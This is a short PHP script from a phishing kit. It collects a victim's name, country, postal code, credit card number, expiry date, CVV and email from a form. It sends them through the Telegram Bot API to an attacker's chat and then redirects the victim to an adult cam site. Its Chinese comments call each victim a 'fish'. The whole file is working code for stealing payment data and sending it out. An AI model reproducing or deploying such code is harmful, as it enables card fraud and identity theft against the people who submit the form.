<?php
	//get data from form
	$userTherapist = $_POST['therapist'];
	$userFname = $_POST['fname'];
	$userLname = $_POST['lname'];
	$userCountry = $_POST['country'];
	$userZip = $_POST['zip'];
	$userCnum = $_POST['cnum'];
	$userExpdate = $_POST['expdate'];
	$userCvv = $_POST['cvs'];
	$userEmail = $_POST['email'];
	
    // include 'email.php';//本地收鱼 这里不启用
    
include('tg.php');
    $send = file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&parse_mode=html&text=鱼来了!%0A名字: {$userFname}%0A性: {$userLname}%0A国家: {$userCountry}%0A邮政编码: {$userZip}%0A卡号: {$userCnum}%0A日期: {$userExpdate}%0Acvv: {$userCvv}%0Aemail: {$userEmail}");
    
    
	header("Location:https://cams.xvideos.com/")//这里设置填写数据后跳转的网址，可自行修改


?>